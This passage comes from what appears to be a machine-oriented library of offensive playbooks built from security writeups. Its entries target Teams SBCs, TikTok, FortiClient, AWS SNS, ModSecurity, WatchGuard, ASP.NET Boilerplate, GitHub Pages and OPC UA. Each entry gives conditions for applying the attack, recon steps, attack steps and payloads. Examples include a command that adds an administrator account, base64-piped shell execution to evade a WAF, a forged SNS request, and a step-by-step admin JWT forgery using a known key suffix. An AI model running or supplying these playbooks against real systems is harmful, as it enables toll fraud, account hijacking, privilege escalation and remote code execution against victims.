(Replace placeholders like <SBC_FQDN>, <ATTACKER_IP>, <ATTACKER_EMAIL>, <RECIPIENT_NUMBER>, etc., appropriately. The key is the 'Contact' header and the 'Request-URI' host matching the SBC's FQDN).
tools_recommended: SIPp: For crafting and sending custom SIP messages.
Wireshark: To capture and analyze SIP traffic.
Custom Python scripts using libraries like 'pysip' or 'kamailio-ng' CLI tools if applicable.
success_indicators: The victim's Session Border Controller places an external call to a number specified by the attacker.
The attacker receives call detail records (CDRs) showing calls originating from the victim's phone line.
The victim's phone system reports a call being made, and the attacker is billed for it (toll fraud).
failure_indicators: The SBC rejects the SIP INVITE message with an error code (e.g., 400 Bad Request, 403 Forbidden) and does not attempt to place a call.
The SBC requires additional authentication that the attacker cannot provide (e.g., certificate validation).
The SBC does not classify the message as originating from Microsoft and discards it or routes it elsewhere.

playbooks.impact: An unauthenticated attacker can initiate unauthorized external calls through the victim's Microsoft Teams Direct Routing setup, leading to toll fraud and financial losses for the victim. This abuses the trust placed in the SBC's classification of SIP messages from Microsoft.
playbooks.key_lesson: When integrating with third-party communication platforms like Microsoft Teams Direct Routing, ensure that Session Border Controllers implement robust authentication mechanisms for incoming SIP messages beyond simple header content matching, to prevent spoofing and toll fraud.

meta.title: Vulnerability in TikTok Android app could lead to one-click account hijacking

tech_stack_fingerprints: TikTok Android app package name: com.ss.android.ugc.tiktok (or similar for different regions)

trigger_conditions.when_to_apply: When the target application handles deep links that can load arbitrary URLs into a WebView, and these WebViews have JavaScript bridges exposed.
prerequisites: Attacker can trick a user into clicking a specially crafted link.
applicability_signals: The target application handles deep links.
Deep links can specify URLs to be loaded in a WebView.
The WebView has accessible JavaScript bridges.
skip_if: The application strictly validates all deep link URLs and does not allow arbitrary external URLs.
JavaScript bridges are not exposed or are properly secured within the WebView.

recon_steps: Analyze the TikTok Android application's deep link handling by observing how different URI schemes are processed.
Identify if deep links can trigger the loading of external URLs within a WebView component of the app.
attack_steps: Step 1: Craft a malicious deep link that points to a URL controlled by the attacker, designed to be opened by the TikTok app.
Step 2: Entice a victim to click on the crafted malicious deep link.
Step 3: The malicious URL loads within the TikTok app's WebView.
Step 4: Leverage the exposed JavaScript bridges within the WebView to execute arbitrary JavaScript code in the context of the app.
Step 5: Use the executed JavaScript to interact with the app's functionality, such as hijacking the user's session or performing actions on their behalf.
payloads_or_patterns: A specially crafted deep link URL that bypasses deeplink verification and loads an attacker-controlled URL into a WebView. (Specific payload structure not detailed in writeup)
tools_recommended: App analysis tools (e.g., MobSF, Frida) to understand deep link handling and identify JavaScript bridges.
URL crafting tools to construct malicious deep links.
success_indicators: The attacker's WebView loads successfully.
Arbitrary JavaScript is executed within the app's WebView.
Observable actions taken on the victim's TikTok account (e.g., private videos made public, messages sent, videos uploaded).
failure_indicators: The deep link does not load the intended URL, or an error page is displayed.
JavaScript execution within the WebView is blocked.
No observable actions are taken on the victim's account.

playbooks.impact: Account hijacking, enabling attackers to access and modify users' TikTok profiles, publicize private videos, send messages, and upload videos on behalf of users.
playbooks.key_lesson: When mobile applications handle deep links that load external URLs into WebViews, always investigate the presence and security of JavaScript bridges to prevent remote code execution and account hijacking.

meta.title: CVE-2022-26113: FortiClient Arbitrary File Write As SYSTEM

tech_stack_fingerprints: FortiClient's scheduler service running as SYSTEM

trigger_conditions.when_to_apply: This vulnerability is applicable when a user has the ability to trigger a VPN configuration backup through the FortiClient UI, and the file path validation is bypassable. It requires the FortiClient service to be running with SYSTEM privileges.
prerequisites: FortiClient installed on a Windows system.
The FortiClient scheduler service is running and has SYSTEM privileges.
The user can interact with the FortiClient UI and initiate a configuration backup.
applicability_signals: Existence of the 'Backup' feature in the FortiClient UI.
The ability to specify a backup file path.
The file path chosen for backup is written by a service running as SYSTEM.
skip_if: FortiClient is not installed.
The FortiClient scheduler service is not running or does not have SYSTEM privileges.
The application strictly validates file paths to prevent writing to arbitrary locations before the backup operation.

recon_steps: Step 1: Verify FortiClient installation and version on the target Windows machine.
Step 2: Confirm that the FortiClient UI is accessible to the user and the backup feature is available.
Step 3: Identify the default installation path of FortiClient to understand potential system directories.
Step 4: (Optional but recommended) Attempt to enable Electron debugging to inspect the UI and JavaScript functions for backup operations.
attack_steps: Step 1: Interact with the FortiClient UI to access the configuration backup feature.

Step 2: Modify the backup file path to a sensitive system location where write permissions are typically restricted for normal users (e.g., SYSTEM's startup folder, a critical system configuration directory).
Step 3: If direct UI modification is prevented, use a debugger (e.g., Chrome DevTools attached to the Electron process) to disable the file path input field's `disabled` property.
Step 4: Trigger the configuration backup. The FortiClient service, running as SYSTEM, will write the backup file to the specified arbitrary location.

Step 5: If the goal is privilege escalation, craft a malicious script (e.g., a batch file) and ensure its contents are partially controllable during the backup process, then place it in a location that is automatically executed upon user login or system startup (e.g., an administrator's startup folder).
payloads_or_patterns: # Example of a malicious batch file payload to be written to a startup directory
# cmd.exe /c "net user attacker password /add && net localgroup administrators attacker /add"
# Example of a file path bypass (conceptual, actual exploit may require debugger)
tools_recommended: Burp Suite (for manual testing and observing HTTP requests if any are involved, though unlikely here)
Chrome DevTools (to debug the Electron application and manipulate UI elements)
Process Monitor (to observe file write operations and confirm the location and content of the written file)
Windows Sysinternals Suite (for detailed system analysis and file operation monitoring)
success_indicators: A file is written to an arbitrary location on the filesystem, especially to a location not typically writable by the user.
Observable execution of a malicious script (e.g., a new user account created, system configuration changed) after placing it in an autostart directory.
Confirmation via Process Monitor that `FCConfig.exe` or a related process wrote a file to the attacker-controlled path while running as SYSTEM.
failure_indicators: The backup operation fails with a permissions error for the chosen path.
The FortiClient UI prevents modification of the file path or validates it strictly.
No file is written to the target location, or the file written is not the expected malicious payload.
If a script is placed in startup, and it does not execute upon the next relevant event (e.g., user login).

playbooks.impact: An attacker can write arbitrary files to any location on the system with SYSTEM privileges. This can lead to privilege escalation by writing malicious executables, scripts, or configuration files to sensitive directories such as startup folders, system directories, or by overwriting existing critical files.
playbooks.key_lesson: Always scrutinize file path input validations in applications that perform file operations with elevated privileges; debugging the client-side UI can reveal bypass opportunities before the backend operation is triggered.

meta.title: CVE-2021-38297 – Analysis of a Go Web Assembly vulnerability

trigger_conditions.when_to_apply: This vulnerability is applicable when Go is used to compile applications targeting WebAssembly, and these applications are executed in an environment that processes untrusted WebAssembly modules.
prerequisites: Target application must be compiled using Go and targeting WebAssembly.
The application must process or execute untrusted WebAssembly modules.
applicability_signals: Use of Go language for backend or frontend logic executed via WebAssembly.
WebAssembly execution environments are present.
skip_if: The target does not use Go for WebAssembly compilation.
The target does not execute untrusted WebAssembly modules.

recon_steps: Step 1: Identify if the target application uses Go and compiles to WebAssembly by examining build scripts, source code repositories, or server-side logic.
Step 2: Determine if the application executes untrusted WebAssembly modules, for example, by analyzing its input handling or sandbox mechanisms.
attack_steps: Step 1: Craft a malicious WebAssembly module that exploits the identified memory corruption vulnerability in the Go runtime's WASM module.
Step 2: Provide the crafted malicious WebAssembly module to the target application for execution within its WASM runtime.
Step 3: Observe the behavior of the target application to confirm successful exploitation.
tools_recommended: Go compiler
WebAssembly tools
Fuzzing tools for WASM
success_indicators: Application crash (e.g., segmentation fault, unhandled exception)
Unexpected memory access or modification
Execution of arbitrary code within the WASM sandbox, if applicable
failure_indicators: WASM module fails to load or execute due to validation errors.
Application behaves normally, indicating the exploit payload was not effective.
WAF or security controls block the upload or execution of the WASM module.

playbooks.impact: Successful exploitation can lead to memory corruption within the Go runtime when processing WebAssembly, potentially resulting in application crashes, denial-of-service, or in some scenarios, arbitrary code execution within the context of the WebAssembly sandbox.
playbooks.key_lesson: When dealing with WebAssembly modules compiled from Go, be aware of potential memory corruption vulnerabilities in the Go runtime's WASM execution engine and ensure proper sandboxing and input validation for untrusted modules.

meta.title: Exploiting Improper Validation of Amazon Simple Notification Service SigningCertUrl

affected_components: AWS SDKs used for SNS message validation
tech_stack_fingerprints: SNS HTTP/S POST requests with x-amz-sns-message-type: Notification header
SNS JSON message body containing Signature and SigningCertURL fields

trigger_conditions.when_to_apply: When an application subscribes to Amazon SNS notifications via an HTTP/S endpoint and validates message authenticity using the provided Signature and SigningCertURL.
prerequisites: The target application must be an SNS HTTP/S subscriber.
The target application must perform signature validation using the SigningCertURL provided in the SNS message.
applicability_signals: Receiving POST requests with `x-amz-sns-message-type: Notification` header.
SNS JSON messages containing `Signature` and `SigningCertURL` fields.
skip_if: The target application does not expose an HTTP/S endpoint for SNS notifications.
The target application does not validate the SNS message signature.
The target application uses a custom signature validation mechanism that is not vulnerable to this bypass.

recon_steps: Step 1: Identify applications that are subscribers to SNS topics via HTTP/S endpoints by observing incoming POST requests with SNS-specific headers.
Step 2: Analyze the SNS JSON message payload received by the subscriber to confirm the presence of `Signature` and `SigningCertURL` fields.
attack_steps: Step 1: Craft a malicious SNS notification message. The core of the attack involves manipulating the `SigningCertURL` to point to an attacker-controlled server or a location that can be used to influence the validation process. The writeup implies that official AWS SDKs had a loophole, suggesting that simply providing a different `SigningCertURL` might be sufficient if the SDK validation is weak.

Step 2: Modify the `SigningCertURL` in the crafted SNS message to a URL controlled by the attacker. This URL should ideally be crafted to either trick the validation into accepting the forged signature, or to leak information. The exact URL depends on the specific vulnerability in the SDK's validation logic.
Step 3: Send the forged SNS message to the target SNS endpoint. If the target application's SNS message validation is flawed, it will process the message as legitimate.
Step 4: Observe the impact of the forged message on the target application. This could involve triggering unintended actions, exfiltrating data, or gaining unauthorized access.
payloads_or_patterns:
POST / HTTP/1.1
Host: <TARGET_URL>
x-amz-sns-message-type: Notification
x-amz-sns-message-id: <ANY_ID>
x-amz-sns-topic-arn: <ANY_ARN>
x-amz-sns-subscription-arn: <ANY_SUBSCRIPTION_ARN>
Content-Length: <LENGTH>
Content-Type: text/plain; charset=UTF-8

{
  "Type": "Notification",
  "MessageId": "<ANY_ID>",
  "TopicArn": "<ANY_ARN>",
  "Subject": "Forged Message",
  "Message": "This is a forged message.",
  "Timestamp": "<CURRENT_TIMESTAMP>",
  "SignatureVersion": "1",
  "Signature": "<FORGED_SIGNATURE>",
  "SigningCertURL": "<ATTACKER_CONTROLLED_URL>",
  "UnsubscribeURL": "<ANY_UNSUBSCRIBE_URL>"
}
tools_recommended: Burp Suite: To intercept and modify SNS messages.
Custom script (e.g., Python): To craft and send forged SNS messages, potentially automating the process of finding vulnerable URLs.
AWS CLI: To interact with SNS topics and subscriptions for testing purposes.
success_indicators: The target application processes the forged SNS message as legitimate.
Unintended actions are performed by the target application based on the forged message content.
Data leakage occurs as a result of processing the forged message.
failure_indicators: The target application rejects the forged SNS message due to signature validation failure (e.g., returns 400 or 500 status code with an error message indicating invalid signature).
The `SigningCertURL` is hardcoded or validated against a known list of AWS domains, preventing external control.
The application logs or alerts on receiving an invalidly signed message.

playbooks.impact: An attacker can forge SNS notifications, potentially leading to unauthorized actions, data exfiltration, or denial of service if the forged messages cause the subscriber to enter an error state. The writeup suggests that it allows attackers to forge messages to all SNS HTTP subscribers.
playbooks.key_lesson: Always validate the authenticity of `SigningCertURL` and ensure that the certificate used for signature verification actually corresponds to the expected certificate authority and issuer, rather than solely trusting the provided URL or signature.

meta.title: Bypassing ModSecurity for RCEs

tech_stack_fingerprints: ModSecurity rules are detected when standard attack payloads are blocked

trigger_conditions.when_to_apply: When ModSecurity or a similar WAF is deployed and blocking known RCE or command injection payloads, and the application allows execution of system commands or file operations.
prerequisites: The target environment must be running a Unix-like operating system.
The application must have functionality that allows passing strings to be executed as system commands or interpreted by shell utilities.
ModSecurity rules must be present and actively blocking common attack patterns.
applicability_signals: Standard RCE payloads (e.g., `cat /etc/passwd`, `id`) are blocked by the WAF.
File operations are permitted by the application.
The application uses Linux utilities that can be leveraged for command execution.
The target environment is identified as Linux/Unix.
skip_if: The WAF does not block any command injection attempts.
The application does not allow any form of command execution or file manipulation.
The target environment is not Linux/Unix.

recon_steps: Step 1: Identify if ModSecurity is present by sending standard RCE payloads and observing blocks (e.g., `id`, `whoami`, `ls`).
Step 2: Determine if the application allows execution of commands by testing various input fields with simple commands and checking for execution.
Step 3: Fingerprint the underlying OS to confirm if it's Linux/Unix, as the bypass techniques described are OS-specific.
attack_steps: Step 1: Test filename character class bypass: Send payload `cat /etc/pass[w]d` or `cat /etc/pass[!x]d` to bypass WAF rules that might block `cat /etc/passwd`.
Step 2: Test command path bypass: If direct command execution is blocked, try using the full path with character classes, e.g., `/usr/bin/who[a]mi`.
Step 3: Utilize `base64` for command obfuscation: Encode a command (e.g., `uname -a`) to base64 (e.g., `dW5hbWUgLWE=`).

Step 4: Construct the final payload using `printf`, `base64 -d`, and `sh`: `printf dW5hbWUgLWE= | base64 -d | sh` to execute the decoded command, bypassing blacklisted utilities like `echo` and `sh` directly.

Step 5: For Windows targets, test wildcard bypasses in file paths: Attempt to execute `C:\Windows\System32\WindowsPowerShell\v1.0\power?hell.exe -File test.ps1` where ModSecurity's path-based rules might not cover Windows-style paths.
tools_recommended: Burp Suite: To intercept and modify HTTP requests, particularly for testing different payloads and observing WAF responses.
Linux command line: For generating base64 encoded commands and understanding command execution flow.
success_indicators: Successful retrieval of sensitive file contents (e.g., `/etc/passwd`).
Execution of commands like `whoami`, `id`, `uname -a` and seeing their output in the response.
The WAF does not block the crafted payload, and the intended command is executed on the server.
failure_indicators: WAF returns a 403 Forbidden or similar block response.
The application returns an error indicating an invalid command or file not found.
No observable output or behavior change indicating command execution.

playbooks.impact: Remote Code Execution (RCE) on the target server, allowing attackers to execute arbitrary commands, read sensitive files, exfiltrate data, or gain full control of the system.
playbooks.key_lesson: When WAFs like ModSecurity block common attack patterns, investigate alternative syntax, OS-specific features (like character classes in filenames, full command paths), and utility chaining (like base64 encoding) to bypass detection rules.

meta.title: Blind Exploits To Rule Watchguard Firewalls

tech_stack_fingerprints: CherryPy Python backend identified by response content/headers on administration interface

trigger_conditions.when_to_apply: When an administration interface of a WatchGuard firewall is exposed to the internet and accessible via HTTP/HTTPS, and the target is running a vulnerable firmware version.
prerequisites: The firewall's administration interface must be accessible.
applicability_signals: The presence of the '/agent/login' endpoint.
The endpoint accepts XML-RPC requests.
The XML-RPC structure contains sensitive parameters like 'username' and 'password'.
skip_if: The administration interface is not accessible.
The '/agent/login' endpoint returns unexpected responses or behaves differently than described.
The firewall is confirmed to be running a patched firmware version.

recon_steps: Step 1: Scan for exposed WatchGuard administration interfaces on ports 8080 and 4117.
Step 2: Identify the presence of the '/agent/login' endpoint by sending a generic POST request.
Step 3: Analyze the response headers and content for fingerprints indicating WatchGuard appliances (e.g., X-WatchGuard-Version, 'WatchGuard Appliance Manager' in HTML).
attack_steps: Step 1: Craft an XML-RPC request to the /agent/login endpoint with the 'login' method.
Step 2: In the 'struct' parameter, include members for 'user' and 'password'.
Step 3: Inject XPath injection payloads into the 'user' or 'password' string values to attempt to manipulate the XML parsing and bypass authentication or extract information.

Step 4: Observe the response status code and body for any deviations or indications of successful injection (e.g., different error messages, successful login with crafted credentials, or unexpected data in the response).
tools_recommended: curl: For crafting and sending raw HTTP requests with XML-RPC payloads.
Burp Suite: To intercept, modify, and replay requests, and to automate payload testing.
Custom Python script: To automate the process of sending various XPath injection payloads and analyzing responses, especially for blind XPath injection.
success_indicators: A 200 OK response with a valid session token or administrator privileges when attempting to log in with injected credentials.
Error messages that change based on the injected XPath query, indicating successful injection and selective data leakage.
Successful retrieval of sensitive configuration data (e.g., IP addresses, system information) in the response body when using blind XPath injection techniques.
failure_indicators: Consistent 401 Unauthorized or other error codes regardless of the injected payload. This might suggest input sanitization or a different vulnerability class.
The XML-RPC parsing engine rejects malformed XML-RPC requests, indicating the initial payload structure is incorrect.
No variation in error messages or response content when attempting different XPath injection payloads, suggesting the input is not being processed by an XPath engine in a vulnerable way.

playbooks.impact: Unauthenticated remote code execution (RCE) via exploiting the initial foothold (leading to pre-authentication root access) or sensitive data disclosure through XPath injection, allowing an attacker to gain full control over the firewall.
playbooks.key_lesson: When dealing with XML-RPC interfaces, especially those using C/C++ backends, always consider the potential for XML-based injection vulnerabilities like XPath Injection if XML content is processed without strict validation and sanitization.

meta.title: Tetsuji: Remote Code Execution on a GameBoy Colour 22 Years Later

target_profile.technology: GameBoy Colour with Mobile Adapter GB
affected_components: Pokemon Crystal game, Mobile Adapter GB communication protocol
tech_stack_fingerprints: Mobile Adapter GB accessory, Pokemon Crystal game, BGB emulator with link cable emulation

trigger_conditions.when_to_apply: When the target system is a GameBoy Colour using the Mobile Adapter GB accessory and running Pokemon Crystal, and the attacker can intercept or inject data into the communication channel between the GameBoy and the internet.
prerequisites: GameBoy Colour with Mobile Adapter GB accessory
Pokemon Crystal game cartridge
A means to emulate or interact with the Mobile Adapter GB's communication protocol (e.g., BGB emulator with link cable emulation)
Knowledge of the Mobile Adapter GB's command set
applicability_signals: The presence of the Mobile Adapter GB accessory
Pokemon Crystal game running on a GameBoy Colour
The Mobile Adapter GB supporting protocols like HTTP and POP3 for data transfer
skip_if: The absence of the Mobile Adapter GB accessory
The GameBoy is not running Pokemon Crystal or a compatible game
The communication channel is inaccessible or not vulnerable to data injection/manipulation

recon_steps: Step 1: Identify the target system as a GameBoy Colour with the Mobile Adapter GB accessory, running Pokemon Crystal.
Step 2: Research the Mobile Adapter GB's communication protocol and command set, referencing resources like Shonumi's site and Háčky's prior work.
Step 3: Set up an emulator (e.g., BGB) with link cable emulation to intercept and analyze the protocol in action, observing commands like 'Open Session', 'Close Session', and 'Read Config'.
attack_steps: Step 1: Craft malicious data packets that exploit a vulnerability in the Mobile Adapter GB's protocol handling, targeting command structures or data buffers.
Step 2: Inject these crafted packets into the communication stream between the GameBoy and the internet (emulated or real).
Step 3: Observe the GameBoy's behavior for signs of unexpected execution or crashes, indicative of RCE.
Step 4: If successful, attempt to achieve arbitrary code execution by carefully constructing shellcode compatible with the GameBoy's architecture.
payloads_or_patterns: Malicious data packets designed to overflow buffers or trigger specific command handlers in the Mobile Adapter GB's firmware. Precise payloads would depend on the identified vulnerability, e.g., long strings for buffer overflows.
tools_recommended: BGB emulator for GameBoy Colour emulation and link cable simulation.
Custom scripts (Python recommended) to craft and send malicious packets over the emulated link cable.
Disassemblers and debuggers for analyzing GameBoy/Pokemon Crystal ROM and Mobile Adapter GB firmware.
success_indicators: Unexpected program behavior on the GameBoy Colour after sending crafted packets.
Game crash or reset.
Confirmation of arbitrary code execution through specific game state changes or observable output generated by the injected shellcode.
failure_indicators: No observable change in GameBoy behavior after sending packets (e.g., system continues to operate normally). Suggests payload is incorrect or not reaching the vulnerable component. Pivot to fuzzing other commands or data fields.
Connection errors or unexpected responses from the adapter. Suggests protocol mismatch or incorrect packet formatting. Review captured traffic and protocol documentation.

playbooks.impact: Remote Code Execution on a GameBoy Colour, allowing an attacker to potentially control the device, execute arbitrary code, and achieve full compromise of the gaming console's functionality. This could lead to data exfiltration (if any sensitive data were present), modification of game state, or other malicious actions.
playbooks.key_lesson: Investigate older, obscure hardware accessories and their communication protocols for vulnerabilities, as they may have been overlooked and contain exploitable flaws due to their age and limited development resources.

meta.title: Zimbra Open Bucket Data Leak

trigger_conditions.when_to_apply: When a target uses AWS S3 for data storage and an S3 bucket is found to be publicly accessible without proper access controls.
prerequisites: Target uses AWS S3 for storing files.
applicability_signals: Publicly accessible S3 bucket URLs (e.g., https://bucket-name.s3.amazonaws.com/)
S3 bucket content is listed without authentication.
An S3 bucket responds with a list of objects instead of 'Access Denied'.
skip_if: S3 bucket returns 'Access Denied' for all requests without authentication.
WAF blocks access to S3 bucket URLs.

recon_steps: Step 1: Attempt to access known S3 bucket URLs for the target (e.g., https://files.zimbra.com/ and related variations).
Step 2: Observe the response. If a list of objects is returned, the bucket is publicly accessible.
attack_steps: Step 1: Access the publicly listed S3 bucket URL.
Step 2: Browse the listed objects to identify potentially sensitive files (e.g., backups, logs, user data, configuration files).
Step 3: Attempt to download identified files.
Step 4: If sensitive data is found, document the findings and file a report.
tools_recommended: Web browser: To navigate and download files.
AWS CLI: To automate downloading multiple files or listing directory contents if permissions allow.
success_indicators: Successful download of files from the S3 bucket.
Accessing sensitive information such as user emails, passwords, configurations, or system logs.
Response listing objects when accessing the S3 bucket URL without authentication.
failure_indicators: Receiving an 'Access Denied' error when trying to access the bucket or download files (suggests the misconfiguration is not severe or has been fixed).
Receiving a 404 Not Found error for listed files (suggests files may have been removed or paths are incorrect).

playbooks.impact: Unauthorized access to sensitive data including server backups, company documents, user logs, emails, passwords, and configurations, potentially leading to further compromise.
playbooks.key_lesson: Always verify S3 bucket permissions and ensure that sensitive data is not exposed through publicly accessible buckets, even if it's labeled as 'backup' or 'public information'.

meta.title: ASP.NET Boilerplate Multiple Vulnerabilities

trigger_conditions.when_to_apply: When the target uses ASP.NET Boilerplate framework and the JWT SecurityKey is not securely configured.
prerequisites: Target uses ASP.NET Boilerplate version 7.3.0.0 or earlier.
applicability_signals: The login page title (project name) is visible.
The copyright footer contains the project name.
An unauthenticated API endpoint exposes the project name.
The appsettings.json file reveals a predictable JWT SecurityKey pattern (e.g., PROJECTNAME_C421AAEE0D114E9C).
skip_if: The JWT SecurityKey in appsettings.json is a long, random string.
The target is using a version of ASP.NET Boilerplate that has patched this vulnerability.
No predictable project name can be identified from the target application.

recon_steps: Step 1: Navigate to the root of the target application and observe the HTML title tag for the project name.
Step 2: Inspect the page footer for copyright information which may reveal the project name.
Step 3: Attempt to access unauthenticated API endpoints, such as '/api/services/app/session/getCurrentLoginInformations', to see if the project name is exposed.
Step 4: If possible, attempt to retrieve the appsettings.json file or analyze application source code to confirm the structure of the JWT SecurityKey.
attack_steps: Step 1: Construct the JWT SecurityKey by concatenating the identified project name with the constant suffix: '<PROJECT_NAME>_C421AAEE0D114E9C'.

Step 2: Use a JWT library (e.g., Go's 'github.com/golang-jwt/jwt/v4') to create a new JWT. Set claims such as 'http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier' to '1' (representing the default admin user ID), 'iat' and 'nbf' to 0, 'exp' to 2147483647, and 'iss' and 'aud' to the identified project name.
Step 3: Sign the JWT using the HS256 algorithm and the constructed SecurityKey.

Step 4: Craft an HTTP POST request to the '/api/TokenAuth/Authenticate' endpoint. Include a JSON body with any valid username and password (e.g., {'userNameOrEmailAddress': 'any', 'password': 'any', 'tenancyName': 'default'}).
Step 5: In the crafted request's 'Authorization' header, prepend 'Bearer ' to the forged JWT, e.g., 'Authorization: Bearer <FORGED_JWT_HERE>'.
tools_recommended: Burp Suite: To intercept and modify HTTP requests, observe responses, and identify the project name.
Go programming language with 'github.com/golang-jwt/jwt/v4' library: To programmatically generate the forged JWT.
success_indicators: The target application returns a 200 OK status code for the '/api/TokenAuth/Authenticate' request.
The response body contains an authentication token.
Subsequent requests made with this forged token are authorized and grant administrative privileges (e.g., access to user management pages, ability to create new admin users).
failure_indicators: The target application returns a 401 Unauthorized or 403 Forbidden status code for the '/api/TokenAuth/Authenticate' request.
The forged JWT is rejected by the server, indicating an incorrect signature or invalid claims. Pivot to checking for other authentication bypass vectors or misconfigurations.

playbooks.impact: An unauthenticated attacker can forge a JWT and gain unauthorized administrative access to the ASP.NET Boilerplate or ASP.NET Zero application, allowing them to manage users, roles, and potentially other sensitive application features.
playbooks.key_lesson: Always ensure that JWT signing secrets are strong, randomly generated, and not derivable from easily discoverable information like project names.

meta.title: Command Injection in the GitHub Pages Build Pipeline

tech_stack_fingerprints: Builds static sites via GitHub Actions

trigger_conditions.when_to_apply: When a user can configure the source directory for GitHub Pages builds, and that directory name is processed unsafely by the build pipeline.
prerequisites: Attacker has write access to a GitHub repository configured to use GitHub Pages.
Attacker can modify repository settings related to GitHub Pages source directory.
applicability_signals: The GitHub Pages settings page allows specifying a 'source_dir' parameter.
The 'source_dir' parameter is used in the build process without proper sanitization.
skip_if: No 'source_dir' parameter is exposed or configurable by the user.
The 'source_dir' parameter is strictly validated for valid directory names.
The build process does not use shell commands like 'tar' with user-controlled input.

recon_steps: Step 1: Navigate to the GitHub Pages settings for a target repository.
Step 2: Identify the 'source_dir' parameter in the URL or request when configuring the theme or source directory.
attack_steps: Step 1: Modify the 'source_dir' parameter in the POST request to the GitHub Pages theme endpoint.
Step 2: Inject shell metacharacters and commands into the 'source_dir' parameter, for example: `source_dir=/"test" test test>`.
Step 3: Trigger a GitHub Pages build by committing a change to the repository (e.g., by changing the Jekyll theme or making any other commit if the build is set to trigger on all pushes).
Step 4: Monitor the GitHub Actions build logs for signs of command execution or unexpected behavior.
tools_recommended: Burp Suite or OWASP ZAP: To intercept and modify POST requests to the GitHub Pages settings endpoint.
GitHub Actions logs: To observe the results of command injection.
success_indicators: Unexpected output in the GitHub Actions build logs that indicates command execution.
Creation of unexpected files or directories on the runner.
Errors in the tar command execution that suggest unexpected input.
Callbacks to an attacker-controlled server if the injected command is designed to exfiltrate data or establish a reverse shell.
failure_indicators: A 400 or 422 response from the GitHub API indicating invalid input for 'source_dir'.
The build process failing with a clear error message about invalid directory names, without signs of command execution.
The 'source_dir' parameter being sanitized or rejected, preventing the injection.

playbooks.impact: Remote Code Execution (RCE) within the GitHub Pages build environment, allowing an attacker to potentially access sensitive information, deploy malicious code, or compromise the build infrastructure.
playbooks.key_lesson: Always sanitize and validate user-controlled input for directory names, especially when that input is passed to shell commands like 'tar' within a build pipeline.

meta.title: SATisfying our way into remote code execution in the OPC UA industrial stack

affected_components: OPC UA Stack (specifically the handling of malformed data)

trigger_conditions.when_to_apply: When a target is running an OPC UA server that is vulnerable to memory corruption via malformed data.
prerequisites: Target must be running an OPC UA server.
applicability_signals: Vulnerability discovered in OPC UA stack.
Pwn2Own 2022 entry for OPC UA RCE.
skip_if: Target does not expose an OPC UA service.

recon_steps: Step 1: Identify systems exposing OPC UA services on common ports (e.g., 4840, 4843).
attack_steps: Step 1: Craft a malformed OPC UA message designed to trigger a memory corruption vulnerability.
Step 2: Send the crafted message to the target OPC UA server.
Step 3: Observe for signs of a crash or unexpected behavior indicating potential RCE.
tools_recommended: Custom OPC UA client/fuzzer
success_indicators: OPC UA server crashes.
Execution of arbitrary code on the server.
failure_indicators: OPC UA server gracefully handles malformed data without crashing.
No observed execution of arbitrary code.

playbooks.impact: Remote code execution on the target industrial control system, allowing an attacker to take full control of the device or network.
playbooks.key_lesson: Always fuzz industrial IoT protocols like OPC UA with malformed data to uncover memory corruption and RCE vulnerabilities.

meta.title: Securing Developer Tools: Argument Injection in Visual Studio Code

trigger_conditions.when_to_apply: When a Visual Studio Code extension or feature accepts and processes external input that is not properly sanitized before being passed as arguments to an executable.
prerequisites: Attacker can influence input to a VS Code extension or feature that invokes external commands.
